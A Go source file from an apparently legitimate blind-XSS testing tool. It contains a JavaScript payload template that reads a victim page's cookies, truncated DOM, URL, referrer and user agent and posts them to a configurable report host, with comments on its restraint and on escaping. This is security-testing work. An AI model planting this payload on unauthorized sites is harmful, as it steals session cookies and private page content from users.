package blindxss

import (
	"encoding/json"
	"strconv"
	"strings"
)

// scriptTemplate is the entire capture payload. Read it as the specification of what a
// planted blind-XSS payload is permitted to do, because it is: nothing here is assembled
// from a caller's input, so this text is the whole behaviour.
//
// It reads five properties, posts them once, and stops. See the package doc on why that
// restraint is load-bearing and must not be extended.
//
// Every read is individually guarded. A page that has neutered document.cookie, or is a
// sandboxed frame where reading location throws a SecurityError, must still produce a
// hit — the fact that the payload *executed* is the finding, and losing it because one
// optional field threw would be losing the whole result to a detail.
//
// The DOM snippet is truncated in the browser rather than server-side so a victim's full
// page never crosses the network, and the truncation is reported so a reader cannot
// mistake a cut-off snippet for the whole document.
//
// The POST is text/plain and the response is ignored. text/plain keeps it a CORS "simple
// request", so no preflight is issued and no page CSP connect-src negotiation is needed
// beyond the one already permitting the script itself; ignoring the response means the
// payload has no channel to receive instructions through, which is the property that
// keeps this a beacon and not a foothold.
//
// __TOKEN__, __REPORT_URL__ and __MAX_DOM__ are substituted with JSON-encoded literals.
const scriptTemplate = `(function () {
  var TOKEN = __TOKEN__;
  var URL_ = __REPORT_URL__;
  var CAP = __MAX_DOM__;

  function take(fn) {
    try {
      var v = fn();
      return typeof v === "string" ? v : "";
    } catch (e) {
      return "";
    }
  }

  var html = take(function () { return document.documentElement.outerHTML; });
  var truncated = html.length > CAP;
  if (truncated) { html = html.slice(0, CAP); }

  var body = {
    token: TOKEN,
    cookies: take(function () { return document.cookie; }),
    dom: html,
    truncated: truncated,
    location: take(function () { return location.href; }),
    referrer: take(function () { return document.referrer; }),
    userAgent: take(function () { return navigator.userAgent; })
  };

  try {
    var x = new XMLHttpRequest();
    x.open("POST", URL_, true);
    x.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
    x.send(JSON.stringify(body));
  } catch (e) {}
})();
`

// renderScript substitutes the per-token values into the template.
//
// The token and URL are encoded as JSON string literals rather than pasted in directly.
// Both are in practice ours — the token comes from mintToken's [a-z0-9] alphabet and is
// checked against the minted set before this is ever called, and the URL is built from
// operator-configured Options.BaseURL — but a payload that becomes injectable the day
// someone widens the token alphabet or accepts a BaseURL from a config file is a trap
// worth not setting. jsonString additionally escapes the sequences that would let a
// value break out of an inline <script> block or an HTML comment.
func renderScript(token, reportURL string, maxDOM int) string {
	r := strings.NewReplacer(
		"__TOKEN__", jsonString(token),
		"__REPORT_URL__", jsonString(reportURL),
		"__MAX_DOM__", strconv.Itoa(maxDOM),
	)
	return r.Replace(scriptTemplate)
}

// jsonString renders s as a JavaScript string literal that is also safe inside an inline
// <script> element.
//
// json.Marshal is used for exactly this and not merely as a convenient quoter:
// encoding/json's default HTML escaping (the mode json.Encoder.SetEscapeHTML(false) turns
// off, which this must never do) already rewrites `<`, `>` and `&` to <, > and
// &. That is what makes the result safe in an inline block, where a bare `</script`
// inside a string still closes the element for the HTML parser and a bare `<!--` opens a
// comment that swallows the rest of the program. The escapes are invisible to JavaScript
// and defeat both, so no further rewriting is needed here — an earlier revision added
// three ReplaceAll calls for these characters that were literal no-ops, since json had
// already replaced them.
func jsonString(s string) string {
	b, err := json.Marshal(s)
	if err != nil {
		// json.Marshal of a string cannot fail; returning an empty literal rather than
		// panicking keeps a served script syntactically valid whatever happens.
		return `""`
	}
	return string(b)
}
